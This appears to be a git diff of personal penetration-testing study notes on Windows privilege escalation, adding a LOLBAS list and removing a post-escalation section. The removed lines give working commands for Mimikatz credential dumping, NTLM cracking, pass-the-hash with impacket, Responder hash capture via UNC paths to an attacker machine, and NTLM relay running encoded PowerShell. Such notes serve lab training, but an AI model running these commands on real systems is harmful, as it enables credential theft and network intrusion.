@@ -4,6 +4,8 @@ pagetitle: Windows Privilege Escalation
 ---
 
 [HTB Windows Privesc Checklist](https://khaelkugler.com/pdf/Windows_Privilege_Escalation_Module_Cheat_Sheet.pdf)
+
+
 ## Enumerating Windows
 
 **Windows Privilege and Access Control**
@@ -184,6 +186,20 @@ C:\Users\Public\reverseshell.exe
 
 ## Abusing Other Windows Components
 
+**Living off of the Land**
+- [LOLBAS](https://lolbas-project.github.io/#) is a great resource similar to gtfobins
+- Microsoft signed files that have extra, unexpected functionality, such as:
+  - Executing code
+  - Compiling code
+  - File operations
+  - Persistence
+  - UAC bypass
+  - Credential theft
+  - Dumping process memory
+  - Surveillance
+  - Log evasion
+  - DLL side-loading/hijacking without relocation
+
 **Using Scheduled Tasks**
 - Need to know who runs the scheduled tasks, what triggers are required, and what the tasks do
 - View scheduled tasks with `Get-ScheduledTask` or `schtasks /query /fo LIST /v`
@@ -256,50 +272,3 @@ C:\Users\Public\reverseshell.exe
 			- `GodPotato.exe -cmd "powershell -e ...."`
 		- Can also use it to create a new administrative user, then rdp/winrm in
 
-## What to do after escalating privileges?
-- Credentials Credentials Credentials
-	- Run WinPEAS again
-	- `Get-ChildItem -Recurse -Filter *.kdbx`
-- [Mimikatz](https://github.com/gentilkiwi/mimikatz) can extract password hashes from memory as a basic user
-	- Prebuilt version [here](https://github.com/gentilkiwi/mimikatz/releases)
-	- Can dump plaintext passwords straight as an Administrator
-	- Run with `.\mimikatz.exe`
-	- `privilege::debug` gives us the `SeDebugPrivilege` to run below commands
-	- `token::elevate` to elevate to SYSTEM user
-	- `lsadump::sam` will dump NTLM hashes of local users
-	- `sekurlsa::logonpasswords` will look for clear-text passwords, dump NTLM hashes (including domain users), and dump Kerberos tickets
-	- One-liner: `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"`
-- Crack NTLM
-	- `hashcat -m 1000 {hash} {password_list} -r {mutations} --force`
-- **Passing NTLM**
-	- Don't necessarily need to crack the NTLM hash to use it
-		- NTLM hashes aren't salted between sessions and remain static
-	- Many tools available:
-		- SMB enumeration: `smbclient` and `crackmapexec`
-		- Command execution: `impacket` -> `psexec.py\/wmiexec.py`
-		- `Mimikatz` can also pass-the-hash
-	- Example - accessing SMB share with `smbclient`
-		- `smbclient \\\\{IP}\\{SMB_share_endpoint} -U Administrator --pw-nt-hash {hash_from_Mimikatz}`
-	- Example2 - getting a shell as an Administrator with `psexec.py`
-		- Searches for a writeable share and uploads an exe to it, registers exe as a Windows service and starts it
-		- `impacket-psexec -hashes :{hash} {DOMAIN}/{user}@{IP}` and
-		- `impacket-wmiexec -hashes :{hash} {DOMAIN}/{user}@{IP}`
-- Cracking Net-NTLMv2
-	- Useful when we are an unprivileged user
-	- We have the target start authentication against a machine we own, and capture the hash used during the authentication process
-	- *Responder* is a good tool for capturing Net-NTLMv2 hashes
-		- Sets up an SMB server that handles auth process and prints hashes
-		- `sudo responder -I {network interface (like tap0)}` to run responder on any given network interface
-	- Getting the target server to contact our server is tricky
-		- With RCE, it's easy, just run something like `dir \\{Our_machine_IP}\share` on the machine running the responder server
-			- Then, crack the hash with hashcat 5600
-		- Without RCE, there are a couple different techniques
-			- If there's a file upload on a webserver on the target, we can use a UNC path (`\\{our_IP}\share\xyz)` and the application may try to reach out for the file
-				- This might not work if the slashes are the wrong way, so try something like `//{IP}/share.php` as the filename
-			- I'd assume local file inclusion would have the same result
-	- **Relay Attack**
-		- Lets say you're in a situation where you're on a local admin account, but it's an admin on a different machine. Additionally, we can't crack the hash from the admin. 
-		- Instead of printing the hash, forward it along using *ntlmrelayx*
-		- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {IP} -c "powershell -enc {base64_command}"`
-			- This will set up an SMB relay to the IP with a powershell command to run
-			- Run SMB `dir` from the machine we own against the *ntlmrelayx* machine, which will immediately pass the hash received onto the target machine
